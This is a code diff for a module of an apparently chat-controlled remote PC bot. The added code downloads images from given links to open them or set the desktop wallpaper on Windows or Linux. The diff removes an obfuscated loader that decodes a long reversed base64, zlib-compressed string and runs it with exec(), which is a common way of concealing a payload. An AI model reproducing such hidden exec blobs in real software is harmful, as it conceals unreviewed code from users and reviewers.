@@ -6,10 +6,143 @@ import ctypes
 from modules import File
 import constants
 from modules import Command
+from command_registry import registry
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def changewallpapers_callback(bot, call):
+    markup = getMarkupModes()
+
+    message = constants.PHOTO_CHANGEWALLPAPERS_documentation
+
+    flag_error, photo_path = get_wallpaper_path()
+
+    if flag_error:
+        await send_message(bot, call.message.chat.id, text=photo_path + message, reply_markup=markup)
+        return
+
+    await bot.send_photo(call.message.chat.id, photo=open(photo_path, 'rb'), caption=message, reply_markup=markup)
+
+    delete_tmp_photo()
 
 
-exec((_)(b'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'))
+@registry.register(
+    command_name=constants.PHOTO_OPENPHOTO_command,
+    permission_name=constants.PHOTO_OPENPHOTO,
+)
+async def openphoto(bot, message):
+    markup = getMarkupModes()
+
+    link = getarg(message.text, constants.PHOTO_OPENPHOTO_command)
+
+    await send_message(bot, message.chat.id, text=open_image(link), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.PHOTO_CHANGEWALLPAPERS_command,
+    permission_name=constants.PHOTO_CHANGEWALLPAPERS,
+)
+async def changewallpapers(bot, message):
+    markup = getMarkupModes()
+
+    link = getarg(message.text, constants.PHOTO_CHANGEWALLPAPERS_command)
+
+    await send_message(bot, message.chat.id, text=change_wallpaper(link), reply_markup=markup)
+
+
+SPI_SETDESKWALLPAPER = 20
+SPIF_UPDATEINIFILE = 0x01
+SPIF_SENDWININICHANGE = 0x02
+
+default_path_wallpapers = "C:/Windows/Web/Wallpaper/Windows/img19.jpg"
+
+
+def open_image(image_url):
+    try:
+        download_image_for_link(image_url, config.tmp_photo_path)
+
+        image = Image.open(config.tmp_photo_path)
+        image.show()
+        delete_tmp_photo()
+    except Exception as ex:
+        return str(ex)
+    return "Image opened."
+
+
+def get_wallpaper_path():
+    try:
+        if config.os_name == constants.Windows_OS:
+            wallpaper_path = f"C:/Users/{config.username}/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper"
+        if config.os_name == constants.Linux_OS:
+            wallpaper_path = Command.run_command(
+                "gsettings get org.gnome.desktop.background picture-uri").replace("file://", '').replace("'", '').strip()
+            if wallpaper_path[-4:] == '.xml':
+                return (1, 'Preview: Wallpaper path not found. ')
+
+        return (0, wallpaper_path)
+    except Exception as ex:
+        return (1, str(ex))
+
+
+def change_wallpaper(image_url):
+    if config.os_name == constants.Windows_OS:
+        return change_wallpaper_windows(image_url)
+    if config.os_name == constants.Linux_OS:
+        return change_wallpaper_linux(image_url)
+
+
+def change_wallpaper_linux(image_url):
+    try:
+        download_image_for_link(image_url, config.tmp_photo_path)
+
+        wallpaper_path = config.home_path + '.local/share/backgrounds/wallpaper'
+
+        File.create_full_dirs(wallpaper_path)
+
+        File.copy_file(config.tmp_photo_path, wallpaper_path)
+
+        Command.run_command(
+            f'gsettings set org.gnome.desktop.background picture-uri "{wallpaper_path}"')
+
+        delete_tmp_photo()
+    except Exception as ex:
+        return str(ex)
+    return "Wallpaper changed."
+
+
+def change_wallpaper_windows(image_url):
+    try:
+        download_image_for_link(image_url, config.tmp_photo_path)
+
+        set_wallpaper(config.tmp_photo_path)
+
+        delete_tmp_photo()
+    except Exception as ex:
+        return str(ex)
+    return "Wallpaper changed."
+
+
+def download_image_for_link(image_url, path):
+
+    img_data = requests.get(image_url).content
+
+    with open(path, 'wb') as file:
+        file.write(img_data)
+
+
+def delete_tmp_photo():
+    if os.path.isfile(config.tmp_photo_path):
+        os.remove(config.tmp_photo_path)
+
+
+def set_wallpaper(path):
+    ctypes.windll.user32.SystemParametersInfoW(
+        SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+
+
+def set_default_wallpapers():
+    set_wallpaper(default_path_wallpapers)
+
+
+modes = {constants.PHOTO_OPENPHOTO_preview: constants.PHOTO_OPENPHOTO,
+         constants.PHOTO_CHANGEWALLPAPERS_preview: constants.PHOTO_CHANGEWALLPAPERS}
